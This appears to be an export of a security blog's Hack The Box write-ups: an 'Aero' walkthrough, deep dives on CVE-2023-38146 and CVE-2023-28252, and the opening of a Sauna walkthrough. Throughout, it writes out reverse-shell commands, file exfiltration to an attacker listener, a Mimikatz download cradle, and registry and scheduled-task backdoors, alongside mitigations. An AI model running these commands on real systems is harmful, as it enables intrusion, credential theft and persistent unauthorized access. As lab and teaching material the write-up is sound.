        "content": "Aero Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Aero How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\nnmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:23:39 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:23 GMT Nmap scan report for 10.129.229.128 Host is up (0.036s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 5.29 seconds Initial thoughts: Well looks like we are checking out the webserver…. Basic UDP Scan:\nsudo nmap $box -sU -Pn -oA UDPbasicScan kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:23:55 zsh ❯ sudo nmap $box -sU -Pn -oA UDPbasicScan [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:24 GMT Stats: 0:01:53 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 56.00% done; ETC: 08:27 (0:01:29 remaining) Nmap scan report for 10.129.229.128 Host is up. All 1000 scanned ports on 10.129.229.128 are in ignored states. Not shown: 1000 open|filtered udp ports (no-response) Nmap done: 1 IP address (1 host up) scanned in 201.42 seconds Initial thoughts: Nothing additional being run on the UDP side. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 3m25s 🕙 08:27:36 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-04 08:30 GMT Nmap scan report for 10.129.229.128 Host is up (0.040s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Aero Theme Hub Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 11 (88%) Aggressive OS guesses: Microsoft Windows 11 21H2 (88%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 175.09 seconds Findings: Nothing further which means we will be leveraging a web based attack. Web 80: Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories: ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic We can see there is an upload dir which is interesting, as this means we can most likely upload something. Running whatweb I run whatweb for further enumeration however it doesn\u0026rsquo;t tell us anything additional. We knew it was IIS from our nmap scan. kali in HTB/BlogEntriesMade/Aero/scans/nmap 🍣 main 4GiB/7GiB | 0B/1GiB with /usr/bin/zsh took 2m55s 🕙 08:33:15 zsh ❯ whatweb $box http://10.129.229.128 [200 OK] Bootstrap, Cookies[.AspNetCore.Antiforgery.SV5HtsIgkxc], Country[RESERVED][ZZ], Email[support@aerohub.htb], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.AspNetCore.Antiforgery.SV5HtsIgkxc], IP[10.129.229.128], Microsoft-IIS[10.0], Script, Title[Aero Theme Hub], X-Frame-Options[SAMEORIGIN], X-Powered-By[ARR/3.0] Web-site Enumeration: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Discovering the upload portal: Looking at the page it appears to be a single page site dedicated to windows 11 themes:\nWe find the upload portal straight away:\nAs we can see it\u0026rsquo;s looking for us to upload a windows theme. We can see it\u0026rsquo;s looking for \u0026ldquo;Custom Files\u0026rdquo;:\nI have a jpg in this folder currently as I wanted to see if it would allow any other sort of file extensions to be uploaded. I do some investigating and find this page about .theme files:\nI add the extension .theme to a jpg and it\u0026rsquo;s now visible when searching for a file to upload \u0026amp; it appears as expected. Discovering ThemeBleed CVE-2023-38146 exploit: After some searching online I find that there is a known exploit for windows 11 themes called ThemeBleed: 2. Foothold: I find a POC here for the ThemeBleed exploit: https://github.com/Jnnshschl/CVE-2023-38146 The creator has also written a blog-post to accompany the POC. +Deep Dive+: I have written a deep dive on this particular exploit you can find it here: https://bloodstiller.com/articles/understandingthemebleedcve-2023-38146/ Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: Reading the blog post we can see we need to create a reverse shell dll which will then be used as part of the exploit. Luckily the author has created a POC for this also:\nhttps://github.com/Jnnshschl/ThemeBleedReverseShellDLL Let\u0026rsquo;s spin up a windows VM to build this:\nI prefer to use a Windows 10 VM customized with the Mandiant Commando script You will also require Visual Studio to compile this (+not Visual Studio Code+ ), so if you don\u0026rsquo;t have this you will need to install it . Setup the project:\nOpen visual studio Clone the repo Put our attack IP in the relevant pat:\nOn the right hand side find the main.cpp file ans scroll down to lines 32/34 We enter our Attack Machines IP \u0026amp; Port number we want to listen on. Ensure \u0026ldquo;autoReconnect\u0026rdquo; is set to false Set to release per instructions:\nBuild the solution:\n+Note+: Building the solution is just a way to saying \u0026ldquo;Compile the exploit\u0026rdquo; The file should be located in:\nC:\\Users\\[YourUserName]\\source\\repos\\ThemeBleedReverseShellDLL\\x64\\Release\\ThemeBleeedReverseShell.dll Running the ThemeBleed Exploit to get a reverse shell: Switching back to the main repo, we clone that:\ngit clone https://github.com/Jnnshschl/CVE-2023-38146.git Moving the compiled reverse shell to the relevant folder:\nReading the instructions we need to move the compiled ThemeBleeedReverseShell.dll file to the tb folder in the main repo \u0026amp; rename it to Aero.msstyles_vrf_evil.dll +Note+: On the repo it says to move it to td but it\u0026rsquo;s actually called tb Next I start my nc listner:\nrlwrap -cAr nc -nvlp 4711 Trigger the exploit:\npython3 themebleed.py -r [MYAttackMachine] --no-dll It connects and we get our revers shell:\nAs we can see it also appears to dump the hash for sam.emerson and connects as them I tried to crack this with rockyou.txt but no hits. Enumerating as sam.emerson: Get the user flag:\nLooking in documents we find a CVE-2023-28252 pdf and a file called watchdog.ps1\nWhat looks interesting is the CVE-2023-28252_Summary.pdf lets grab that. +Note+: I checked out the watchdog.ps1 script but it\u0026rsquo;s just how the box works by checking for uploaded themes periodically (every 15 seconds) Exfiltrating the CVE-2023-28252_Summary.pdf using base64 encoding: As we only have 1 connection and no evil-winrm etc we have to live off the land. Luckily we can easily exfiltrate this using PowerShell \u0026amp; base64 encoding.\n+Note+: I actually have a custom webserver called bloodserver which would be perfect for this but I wanted to challenge myself to live off the land as much as possible with this box so stuck to using inbuilt windows functionality where possible. Lets base64 encode the pdf and assign to the variable $b64:\n$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Users\\sam.emerson\\Documents\\CVE-2023-28252_Summary.pdf' -Encoding Byte)) Setup our listner:\nnc -nvlp 9999 Send the base64 encoded pdf to our attack host:\nInvoke-WebRequest -Uri http://10.10.14.121:9999/ -Method POST -Body $b64 Received on listner:\nDecode the base64 encoded string:\necho \u0026quot;[bas64encodedpdf]\u0026quot; | base64 -d -w 0 \u0026gt; CVE-2023-28252_Summary.pdf Reading the PDF goes more in depth about CVE-2023-28252:\n3. Privilege Escalation: Researching CVE-2023-28252 (CLFS) Vulnerability: So as it looks like this host is vulnerable to this specific exploit (well its implied) lets find a POC.\nAfter some looking online I find various exploits however this one is actually pre-compiled and can save us some time.\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe +Note+: Looking at the notes it also allows us to pass another binary as an argument to be executed. This is ideal as if we can run a process/binary with elevated privileges we can get a reverse shell as NT/Authority +Deep Dive+: I have written a deep dive on this particular exploit you can find it here:\nhttps://bloodstiller.com/articles/understanding2023-28252-clfs/ I clone exploit:\ngit clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git Transfer the exploit to the target:\nwget http://10.10.14.121:9000/exploit.exe -o ex.exe As this exploit allows us to execute a binary as an argument lets transfer n64.exe to the target too:\nwget http://10.10.14.121:9000/nc64.exe -o nc64.exe Lets start our listener for our reverse-shell:\nrlwrap -cAr nc -nvlp 443 I trigger exploit and pass n64.exe as an argument:\n.\\ex.exe 1208 1 \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 443\u0026quot; High level Command Breakdown: .\\ex.exe: The compiled exploit executable 1208: Process ID to target 1: Execution mode flag Netcat parameters: 10.10.14.121: Our attack IP address 443: Port to connect back to -e cmd: Execute cmd.exe and bind it to the connection Catch NT/Authority system shell:\nGrab root flag:\n4. Persistence: Trying to dump creds with mimikatz: I try and Transfer mimikatz but it gets caught by amsi I try multiple different ways however it\u0026rsquo;s caught each time, luckily there are versions of mimikatz we can from memory: Using invoke-mimikatz.ps1 with a download cradle to dump hashes: Use a download cradle to grab the script: iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1') Perform LSADUMP: Invoke-Mimikatz -Command '\u0026quot;privilege::debug\u0026quot; \u0026quot;lsadump::sam\u0026quot;' +Note+: With this information we can make a kerberos silver ticket; however we have no way to actually authenticate with the host once it\u0026rsquo;s made as nothing is open…so we will need to look at other solutions. Download Cradle Primer: We are going to be using a download cradle later, so it\u0026rsquo;s probably best you understand how they work. What is a Download Cradle? In essence, a download cradle is a lightweight script or command that reaches out to the internet/host, downloads a file, and often executes it directly in memory. And that is why they work so well, as nothing is written to disk and instead runs in memory they are harder to detect:\nIf we look at the invoke-mimikatz.ps1 script we called: iex(new-object net.webclient).downloadstring('http://10.10.14.121:9000/Invoke-Mimikatz.ps1') This reaches out to a remote URL (our attack hosts), download\u0026rsquo;s the payload, and execute \u0026amp; loads it into memory all in one go. (later on you will see me use this again but instead to create a reverse shell that is called upon loading into memory) How Do Attackers Use Download Cradles: There are multiple ways to leverage download cradles in various stages of an attack. The most common is often during initial access or lateral movement phases. Here are some common scenarios:\nDelivering Malware: By downloading and running malware directly in memory, it is possible to bypass traditional file-based antivirus. This is often done by ransomware gangs. Moving Through a Network: In the above case we can use cradles to download tools for privilege escalation or credential theft as we navigate a compromised network/machine. Running Exploits: Tools like Metasploit use download cradles to quickly deliver payloads that exploit vulnerabilities and gain control over systems. Why Download Cradles are Effective: They are a great attack approach as they are: Stealthy: As they work without writing to disk, they leave less evidence for traditional detection tools. Compact: Cradles can be as short as a single line of code (as you can see with invoke-mimikatz), making them hard to spot amid legitimate scripts. Flexible: They can be adjusted and modified allowing what is being downloaded to be executed in real-time, adapting to the environment. Detecting and Stopping Download Cradles: While they’re sneaky, download cradles can be detected with the right strategies:\nNetwork Monitoring: Watching for suspicious connections or repeated download attempts from unusual sources can reveal download cradle activity. Script Restrictions: Limit the use of PowerShell, Curl, or Wget in environments where they aren’t essential. PowerShell, for instance, can be configured to block the Invoke-WebRequest command or require execution approval. EDR Solutions: Endpoint Detection and Response (EDR) tools can help track process execution and identify cradle behaviors based on known patterns and heuristics. Creating a new user who is part of the administrators group: As we are an administrator we can also add a new user and add them to the administrators group.\nI add a new user as part of the administrators group:\nnet user bloodstiller bl00dst1ll3r! /add net localgroup Administrators bloodstiller /add +Note+: I am doing this purely as a mechanism to showcase different ways to establish persistence, however as you have probably noticed there is no way to actually login as this user, the same way as there would be no way to use the Administrators Silver ticket if we made it, so what do we do, glad you asked. Living off the land persistence: As this system only has the webserver running there are no other services we can authenticate against as a means of persistence. Creating silver tickets and adding admin users is great but if we cannot actually utilize those accounts \u0026amp; tickets what can we do? We need to have the host call out to us, by creating a backdoor, or multiple back-doors. Creating a registry key for a back-door: The first backdoor I will create is to create an entry in the registry that runs on login, so that when a user logs in it will call out to my attack machine which has a listener running. Registry Key added: Reg add \u0026quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026quot; /v NewBackDoor /t REG_SZ /d \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; This will trigger when a user logs in, however as we have no way to test this or login as a normal user, we will need to also have another way in. Registry Backdoor Command Breakdown: Command Breakdown:\nReg add\nAdds or modifies a registry key or value. \u0026quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026quot;\nSpecifies the registry path. The Run key allows programs to run automatically when the user logs in. /v NewBackDoor\nSpecifies the name of the registry value being added, here NewBackDoor. Acts as the identifier for this specific entry. /t REG_SZ\nDefines the type of the registry value. REG_SZ is a string value type commonly used for paths or commands. /d \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot;\nSets the data for the registry value. Path: \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe\u0026quot; Path to nc64.exe (likely Netcat), used to open a reverse shell. IP Address*: 10.10.14.121 Our attack machine that is listening where the reverse shell will connect. Port: 4433 The port number on our attack machine listening for the connection. Flag: -e cmd The -e flag executes cmd.exe upon connection, providing a command shell. Potential Defenses/Mitigation\u0026rsquo;s:\nMonitoring: Detect unusual registry changes in HKEY_CURRENT_USER\\...\\Run. Network Monitoring: Watch for unusual outgoing connections to external IPs and ports. Creating a scheduled task back-door: A great means of creating persistence is to create a scheduled task that runs periodically and calls back out to our attack machine. I\u0026rsquo;ve put two approaches below. Version 1: Using nc64.exe to connect back to our attack host periodically: Scheduled Task Backdoor: schtasks /create /tn BackDoor /tr \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; /sc minute /mo 1 /ru System +Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to our attack host: Shell Caught: Just to double check I disconnect to ensure it calls back out to me: Scheduled Task Backdoor Command Breakdown Running a Binary:\nCommand Breakdown:\nschtasks /create Creates a new scheduled task on Windows. /tn BackDoor Sets the task name to BackDoor. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 4433 -e cmd\u0026quot; Specifies the action that the task will execute. Path: \u0026quot;C:\\Users\\sam.emerson\\Documents\\nc64.exe\u0026quot; Path to nc64.exe, used to open a reverse shell. IP Address*: 10.10.14.121 Our attack machine that is listening where the reverse shell will connect. Port: 4433 The port number on our attack machine listening for the connection. Flag: -e cmd The -e flag executes cmd.exe upon connection, providing a command shell. /sc minute Sets the task\u0026rsquo;s schedule frequency to every minute. /mo 1 Modifier that, when used with /sc minute, runs the task every 1 minute. /ru System Specifies that the task should run with System privileges. Running as System grants high privileges, making this backdoor more dangerous. Potential Defenses/Mitigation\u0026rsquo;s:\nMonitor Scheduled Tasks: Regularly check for unauthorized or unusual tasks, especially those scheduled to run frequently or with System privileges. Network Monitoring: Identify repeated outgoing connections to unknown IPs and ports, especially if made by nc64.exe or similar executables. Version 2: Using a base64 encoded PowerShell reverse shell and download cradle to connect back to our attack host: So using the above method with nc64.exe is great and all, but an n64.exe binary will stick out like a sore thumb. A better option would be to create a powershell script and use a download cradle to call back to ourselves, this way everything is loaded in memory and nothing is written to the disk (bar our registry entry)\nCreate our reverse-shell script:\nI use a base64 obfuscated powershell reverse shell as otherwise the AV was able to detect it. I like using https://revshells.com for this We then need to create our scheduled task:\nschtasks /create /tn ScriptCradle /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((New-Object Net.WebClient).DownloadString(''http://10.10.14.121:8080/script.ps1'''))'\u0026quot; /sc minute /mo 1 /ru System Start our listener \u0026amp; webserver:\nWebserver: python3 -m http.server [port] Listener: rlwrap -cAr nc -nvlp 53 The task grabs our script \u0026amp; immediatley executes it in memory:\nWe get our revere shell:\nDouble check by disconnecting \u0026amp; seeing if it re-connects and it does:\nScheduled Task Backdoor Utilizing Download Cradle Command Breakdown:\nschtasks /create Creates a new scheduled task on Windows. /tn ScriptCradle Sets the task name to ScriptCradle. This name is how the task will appear in the Task Scheduler. /tr \u0026quot;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Specifies the action that the task will execute. powershell.exe: Starts PowerShell. Arguments passed to powershell: -WindowStyle hidden: Runs the task in a hidden window to prevent showing the PowerShell window. NoLogo -NonInteractive -ep bypass -nop: PowerShell flags to suppress output and allow script execution bypassing restrictions. IEX ((New-Object Net.WebClient).DownloadString(...)): Uses Invoke-Expression to download and immediately execute the script. /sc minute /mo 1: Sets the task to run every 1 minute. /ru System: Runs the task under System privileges. Lessons Learned: What did I learn? This box was great as means to learn about the CVE\u0026rsquo;s in question. However what I enjoyed more was figuring out ways to achieve persistence with such little open on the host. With only port 80 being open creating a consistent means of re-entering the host was interesting to me and a good exercise Learning about the CVE\u0026rsquo;s CVE-2023-38146 \u0026amp; CVE-2023-28252 was very interesting. There is a great article here about CLFS vulnerability but it\u0026rsquo;s ALOT: https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability I wrote two deep dives to understand these attacks more. What silly mistakes did I make? Not a huge amount this time to be honest, which is fun. Might actually be improving. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

    "http:\/\/localhost:1313\/articles\/understanding2023-28252-clfs\/": {
        "title": "Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability",
        "tags": ["Windows","Active Directory","CVE-2023-28252","CLFS",],
        "content": "Understanding CVE-2023-28252: A Deep Dive into CLFS Privilege Escalation CVE-2023-28252 represents a critical vulnerability in Microsoft\u0026rsquo;s Common Log File System (CLFS) that allows local privilege escalation to SYSTEM.\nWhat is CLFS? The Common Log File System (CLFS) is a logging subsystem introduced in Windows Server 2003 R2. Unlike traditional logging systems, CLFS provides:\nComponent Overview CLFS Architecture: ├── Log Container │ ├── Base Log File (.blf) │ └── Container Files (.clf) ├── Stream Management │ ├── Virtual Log Files │ └── Log Blocks └── Client Interface ├── User Mode API └── Kernel Mode API Key Features Transactional logging with ACID properties High-performance sequential I/O operations Crash recovery capabilities Structured storage for log records Technical Deep Dive Vulnerability Details The vulnerability exists in the CLFS driver (CLFS.SYS) and involves:\nMemory allocation issues in the CLFS driver Improper validation of user-controlled input Potential for heap corruption leading to privilege escalation Real-World Exploitation Example This was performed on the hack the box machine Aero: https://app.hackthebox.com/machines/Aero Available Proof of Concept A pre-compiled exploit is available at:\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe Note: This exploit allows passing another binary as an argument for privileged execution Initial Setup and Exploitation After discovering the target is vulnerable to CVE-2023-28252, we locate a suitable pre-compiled exploit:\nhttps://github.com/duck-sec/CVE-2023-28252-Compiled-exe Note: This exploit allows us to pass another binary as an argument, which is ideal for obtaining a reverse shell as NT/Authority\nClone the Exploit:\ngit clone https://github.com/duck-sec/CVE-2023-28252-Compiled-exe.git Transfer Required Files to Target: First, transfer the exploit:\nwget http://10.10.14.121:9000/exploit.exe -o ex.exe Then, transfer netcat for the reverse shell:\nwget http://10.10.14.121:9000/nc64.exe -o nc64.exe Setup Reverse Shell Listener: On the attack machine:\nrlwrap -cAr nc -nvlp 443 Execute Exploit: Trigger the exploit with netcat as the payload:\n.\\ex.exe 1208 1 \u0026#34;C:\\Users\\sam.emerson\\Documents\\nc64.exe 10.10.14.121 443 -e cmd\u0026#34; Command breakdown: .\\ex.exe: The compiled exploit executable 1208: Process ID to target 1: Execution mode flag Netcat parameters: 10.10.14.121: Attacker\u0026rsquo;s IP address 443: Port to connect back to -e cmd: Execute cmd.exe and bind it to the connection Confirm Privilege Escalation: Successfully receive NT/Authority SYSTEM shell:\nImpact Analysis Affected Systems Matrix: Windows Version Architecture Vulnerable Server 2022 x64 Yes Server 2019 x64 Yes Windows 11 x64 Yes Windows 10 x64 Yes Detection and Prevention: Mitigation Strategies: System Updates:\nApply latest Windows security updates Enable automatic updates Access Controls:\nImplement principle of least privilege Monitor and restrict access to CLFS-related operations System Monitoring:\nMonitor for suspicious CLFS operations Track privilege escalation attempts References: Microsoft Security Advisory CVE-2023-28252 Details (NVD) Bleeping Computer Analysis Duck-Sec\u0026rsquo;s POC Repository Rapid7\u0026rsquo;s For a very deep dive Fortra.com ",

        "title": "Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability",

        "content": "Understanding CVE-2023-38146: ThemeBleed Windows Vulnerability: ThemeBleed (CVE-2023-38146) represents a critical vulnerability in Windows Theme Feature that allows local privilege escalation through improper handling of theme binary data.\nWhat is ThemeBleed? ThemeBleed is a security vulnerability in the Windows Theme Binary Data feature where improper handling of theme files can lead to:\nLocal privilege escalation Arbitrary file read Potential system compromise Technical Deep Dive: Component Overview: The vulnerability exists in several key Windows components:\nAffected Components: ├── Theme Binary Data Parser │ ├── Handles .THEME and .MSSTYLES files │ └── Responsible for version validation ├── Windows Theme Service │ ├── Loads theme resources │ └── Manages DLL verification └── Desktop Window Manager ├── Applies visual themes └── Executes theme components Discovery Background: Security researcher Will Kirkpatrick discovered this vulnerability while investigating uncommon Windows file formats, specifically focusing on the .THEME format used for Windows visual customization.\nVulnerability Details: The vulnerability involves several key components:\nTheme Components: ├── .THEME files │ └── Contains appearance settings ├── .MSSTYLES files │ ├── Should only contain graphical resources │ └── No executable code intended └── Version handling ├── Special \u0026#34;999\u0026#34; version number └── Improper DLL validation Race Condition Exploitation: The core issue lies in the handling of .MSSTYLES files when a specific version number (999) is used:\nInitial DLL Verification:\nSystem checks \u0026ldquo;_vrf.dll\u0026rdquo; signature Validates file integrity Race Window:\nTime gap between verification and loading Allows DLL replacement Original verification becomes invalid Exploitation:\nMalicious DLL can be substituted System loads replaced DLL Arbitrary code execution achieved Distribution Vector: The vulnerability has two interesting distribution aspects:\nDirect Theme Files:\nDownloads trigger mark-of-the-web warnings Users receive security prompts Some protection provided THEMEPACK Bypass:\n.THEMEPACK files are CAB archives Automatically extract and apply themes Bypass mark-of-the-web protection No security warnings shown Real-World Exploitation Example: This was performed on the hack the box machine Aero: https://app.hackthebox.com/machines/Aero Available Proof of Concept: A public POC for the ThemeBleed exploit is available at:\nhttps://github.com/Jnnshschl/CVE-2023-38146 The creator has also written a blog-post to accompany the POC. +Note+: There are multiple POC\u0026rsquo;s however this is just my preffered one. Exploitation Process Payload Preparation:\nCreate malicious DLL containing reverse shell code Configure connection parameters (IP, port) Compile in Release mode for target architecture Exploit Setup:\nDirectory Structure: └── exploit_root/ ├── tb/ │ └── Aero.msstyles_vrf_evil.dll # Our compiled reverse shell DLL that gains SYSTEM │ └── Aero.msstyles # Modified theme file that triggers the exploit │ └── Aero.msstyles_vrf.dll # Legitimate Microsoft-signed DLL we race against └── themebleed.py # Python script that orchestrates the attack Execution Flow: Attacker starts listener on control server Exploit script triggers theme loading Race condition allows DLL substitution Reverse shell connects to attacker Building the ThemeBleed CVE-2023-38146 Reverse Shell DLL: The exploit requires a reverse shell DLL. A POC for this is available at:\nhttps://github.com/Jnnshschl/ThemeBleedReverseShellDLL Development Environment Setup\nWindows 10 VM (my preffered version is setup using Mandiant Commando script ) Visual Studio +(not Visual Studio Code+) Building Process\nOpen Visual Studio and clone the repo:\nConfigure attack parameters:\nLocate main.cpp Set attack IP and port (lines 32/34) Set \u0026ldquo;autoReconnect\u0026rdquo; to false Prepare for compilation:\nSet to release mode Build the solution: +Note+: \u0026ldquo;Building the solution\u0026rdquo; means compiling the exploit Locate the compiled DLL at: C:\\Users\\[YourUserName]\\source\\repos\\ThemeBleedReverseShellDLL\\x64\\Release\\ThemeBleeedReverseShell.dll Executing the Exploit Clone the main exploit repository: git clone https://github.com/Jnnshschl/CVE-2023-38146.git\nPrepare the payload:\nMove ThemeBleeedReverseShell.dll to the tb folder Rename it to Aero.msstyles_vrf_evil.dll +Note+: The repository mentions td folder but it\u0026rsquo;s actually tb\nStart the listener: rlwrap -cAr nc -nvlp 4711\nExecute the exploit: python3 themebleed.py -r [MYAttackMachine] --no-dll\nReceive the connection:\nImpact Analysis: Affected Systems: Windows Version Architecture Vulnerable Windows 11 x64 Yes Windows 10 x64 Yes Server 2019 x64 Yes Server 2022 x64 Yes Security Implications: The vulnerability can lead to:\nLocal privilege escalation System compromise Unauthorized file access Mitigation: Mitigation Strategies System Updates:\nApply latest Windows security updates Enable automatic updates Access Controls:\n# PowerShell: Restrict theme directory access $acl = Get-Acl \u0026#34;C:\\Windows\\Resources\\Themes\u0026#34; $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( \u0026#34;Users\u0026#34;,\u0026#34;Read\u0026#34;,\u0026#34;Allow\u0026#34;) $acl.SetAccessRule($rule) Set-Acl \u0026#34;C:\\Windows\\Resources\\Themes\u0026#34; $acl Group Policy Settings: Disable theme changes for standard users Restrict access to theme directories Prevention Best Practices System Hardening:\nImplement principle of least privilege Regular security updates Monitor theme-related activities Security Controls:\nApplication control policies User access restrictions System monitoring Block .THEMEPACK files at network edge Monitor DLL loading during theme changes References Microsoft Security Advisory CVE-2023-38146 Details Bleeping Computer Will Kirkpatrick\u0026rsquo;s Technical Analysis ",

        "title": "Sauna HTB Walkthrough: Active Directory, Kerberoasting, and PrintNightmare Exploitation",
        "tags": ["Box","HTB","Easy","Windows","LDAP","Kerberos","Active Directory","Kerberoasting","ASREPRoasting","PrintNightmare","CVE-2021-1675",],
        "content": " Sauna Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Sauna How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Sauna/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:01:03 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:01 GMT Nmap scan report for 10.129.118.79 Host is up (0.038s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds Initial thoughts: Good places to start enumeration are, DNS, Web, RPC, LDAP, Kerberos \u0026amp; SMB. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Sauna/scans/nmap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:01:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:03 GMT Nmap scan report for 10.129.118.79 Host is up (0.038s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-03 15:07:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found 